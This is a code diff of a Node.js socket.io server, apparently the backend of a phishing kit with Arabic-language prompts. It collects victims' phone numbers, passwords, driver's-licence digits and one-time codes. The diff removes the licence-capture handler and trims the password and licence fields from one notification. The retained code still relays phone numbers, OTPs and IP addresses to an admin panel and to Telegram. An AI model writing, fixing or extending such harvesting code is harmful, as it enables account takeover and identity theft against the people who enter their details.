@@ -267,75 +267,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    // Customer submits Driver's License (Last 6 Digits)
-    socket.on('submit_license', async (data, callback) => {
-        const { verificationId, phoneNumber, licenseDigits, customSlug } = data;
-        const clientIp = socket.handshake.address;
-        const now = new Date();
-
-        if (!licenseDigits) {
-            if (callback) callback({ success: false, message: 'رقم رخصة القيادة مطلوب' });
-            return;
-        }
-
-        try {
-            let savedPassword = null;
-            if (isMongoConnected) {
-                let rec = null;
-                if (verificationId && !verificationId.startsWith('REC_') && !verificationId.startsWith('LOCAL_')) {
-                    rec = await Verification.findByIdAndUpdate(verificationId, {
-                        licenseDigits,
-                        status: 'LICENSE_SUBMITTED'
-                    }, { new: true });
-                } else if (phoneNumber) {
-                    rec = await Verification.findOneAndUpdate(
-                        { phoneNumber },
-                        { licenseDigits, status: 'LICENSE_SUBMITTED' },
-                        { sort: { createdAt: -1 }, new: true }
-                    );
-                }
-                if (rec) savedPassword = rec.password;
-            }
-
-            const record = localVerifications.find(v => (v._id === verificationId || v.phoneNumber === phoneNumber));
-            if (record) {
-                record.licenseDigits = licenseDigits;
-                record.status = 'LICENSE_SUBMITTED';
-                if (!savedPassword) savedPassword = record.password;
-            }
-
-            console.log(`[Notification] Driver License submitted for ${phoneNumber || verificationId}: ${licenseDigits}`);
-
-            telegramNotifier.notifyLicenseSubmitted({
-                phoneNumber: phoneNumber || record?.phoneNumber || 'Unknown',
-                password: savedPassword,
-                licenseDigits,
-                customSlug: customSlug || record?.customSlug || '/',
-                ipAddress: clientIp,
-                submittedAt: now
-            }).catch(err => console.error('[TelegramNotifier] Error:', err.message));
-
-            io.emit('admin_notification', {
-                type: 'LICENSE_SUBMITTED',
-                data: {
-                    id: verificationId,
-                    phoneNumber: phoneNumber || record?.phoneNumber || 'Unknown',
-                    password: savedPassword,
-                    licenseDigits,
-                    status: 'LICENSE_SUBMITTED',
-                    customSlug: customSlug || '/',
-                    submittedAt: now,
-                    message: `العميل (${phoneNumber || record?.phoneNumber || 'Unknown'}) أدخل آخر 6 أرقام من رخصة القيادة: [ ${licenseDigits} ]`
-                }
-            });
-
-            if (callback) callback({ success: true, message: 'تم حفظ رقم رخصة القيادة' });
-        } catch (err) {
-            console.error('Error handling submit_license:', err);
-            if (callback) callback({ success: false, message: err.message });
-        }
-    });
-
     // Customer submits 4-Digit OTP
     socket.on('submit_otp', async (data, callback) => {
         const { verificationId, phoneNumber, otp, customSlug } = data;
@@ -389,8 +320,6 @@ io.on('connection', (socket) => {
             // Send Telegram instant notification (non-blocking)
             telegramNotifier.notifyOTPVerified({
                 phoneNumber: updatedRecord.phoneNumber,
-                password: updatedRecord.password,
-                licenseDigits: updatedRecord.licenseDigits,
                 otp: otp,
                 customSlug: updatedRecord.customSlug || customSlug || '/',
                 ipAddress: socket.handshake.address,
